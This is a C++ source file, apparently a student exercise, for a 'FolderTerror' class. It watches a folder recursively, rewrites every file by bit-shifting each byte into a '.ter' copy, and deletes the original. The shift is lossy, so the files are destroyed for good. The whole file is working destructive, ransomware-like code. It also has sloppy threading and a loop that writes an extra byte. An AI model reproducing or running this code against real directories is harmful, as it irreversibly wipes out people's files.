#include "FolderTerrorist.h"

using namespace BMSTU;

FolderTerror &FolderTerror::getInstance(const std::filesystem::path &folder_path) {
    static FolderTerror instance(folder_path);
    return instance;
}

FolderTerror::FolderTerror(const std::filesystem::path &folder_path) {
    signalProcessing();
    if (folder_path.string().empty() || !exists(folder_path)) {
        raise(SIGTERM);
    } else {
        folder_path_ = folder_path;
    }
}

void FolderTerror::lurking() {
    while (is_work_) {
        using std::filesystem::recursive_directory_iterator;
        for (auto &file: recursive_directory_iterator(folder_path_)) {
            if (file.path().extension().string() != ".ter") {
                terror_wait_files_.push(file.path());
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}

void FolderTerror::isPossibleToTerror() {
    while (is_work_ || !terror_wait_files_.empty()) {
        {
            std::filesystem::path path_to_file;
            {
                const std::lock_guard<std::mutex> lock(mtx_);
                if (!terror_wait_files_.empty()) {
                    path_to_file = terror_wait_files_.front();
                    terror_wait_files_.pop();
                }
            }
            terrorFile(path_to_file);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
}

void FolderTerror::terrorFile(const std::filesystem::path &path_to_file) {
    if (!path_to_file.empty() && !std::filesystem::is_directory(path_to_file)) {
        std::ifstream extraction(path_to_file, std::ios::in | std::ios::binary);
        if (!extraction.fail()) {
            std::ofstream record(path_to_file.string() + ".ter", std::ios::out | std::ios::binary);
            while (!extraction.eof()) {
                char symbol = 0;
                extraction.read(reinterpret_cast<char *>(&symbol), sizeof(symbol));
                symbol = symbol << 1;
                record.write(reinterpret_cast<char *>(&symbol), sizeof(symbol));
            }
            extraction.close();
            record.close();
            remove(path_to_file);
        }
    }
}

void FolderTerror::startTerror() {
    size_t length = std::thread::hardware_concurrency() - 1;
    auto *thread = new std::thread[length];
    thread[0] = std::thread([this]() { this->lurking(); });
    for (size_t i = 1; i < length; i++) {
        thread[i] = std::thread([this]() {
            isPossibleToTerror();
        });
    }

    for (size_t i = 1; i < length; i++) {
        if (thread[i].joinable())
            thread[i].join();
    }

}

void FolderTerror::processSignal(int signum) {
    switch (signum) {
        case 1:
            std::cout << "Receiving an interactive signal of attention (SIGINT): " << signum << std::endl;
            break;
        case 2:
            std::cout << "Receiving an interactive signal of attention (SIGINT): " << signum << std::endl;
            break;
        case 15:
            std::cout << "Termination request sent to the program (SIGTERM): " << signum << std::endl;
            break;
    }
    std::cout << "Please, stand by" << std::endl;
    is_work_ = false;
}

void FolderTerror::signalProcessing() {
//    signal(SIGHUP, processSignal);
    signal(SIGINT, processSignal);
    signal(SIGTERM, processSignal);
}